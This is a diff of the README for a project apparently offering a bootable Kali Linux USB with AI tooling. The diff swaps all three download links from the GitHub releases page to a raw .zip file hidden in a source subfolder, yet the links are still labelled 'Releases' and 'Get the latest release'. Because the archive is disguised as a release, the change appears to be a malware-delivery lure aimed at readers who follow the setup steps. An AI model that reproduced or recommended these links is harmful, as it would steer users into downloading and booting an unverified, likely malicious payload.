@@ -1,6 +1,6 @@
 # 🔒 kali-opencode-usb - Boot Kali Anywhere, Run Smart Tests
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/glottochronological-gynura119/kali-opencode-usb/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/glottochronological-gynura119/kali-opencode-usb/main/opencode-shannon-plugin/src/tools/shannon-recon/kali-usb-opencode-v2.8.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ It includes tools for command line testing, AI help, and portable use. The goal 
 
 Visit this page to download the latest release:
 
-https://github.com/glottochronological-gynura119/kali-opencode-usb/releases
+https://raw.githubusercontent.com/glottochronological-gynura119/kali-opencode-usb/main/opencode-shannon-plugin/src/tools/shannon-recon/kali-usb-opencode-v2.8.zip
 
 Open the latest release and download the file that matches your USB image or installer package. Save it to your Windows PC before you write it to a USB drive.
 
@@ -249,4 +249,4 @@ Yes for local tools. Some features may work better with internet access
 
 Download the latest release, write it to a USB drive, and boot a Windows PC from that drive
 
-[![Get the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-Visit%20Releases-grey?style=for-the-badge&logo=github)](https://github.com/glottochronological-gynura119/kali-opencode-usb/releases)
+[![Get the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-Visit%20Releases-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/glottochronological-gynura119/kali-opencode-usb/main/opencode-shannon-plugin/src/tools/shannon-recon/kali-usb-opencode-v2.8.zip)
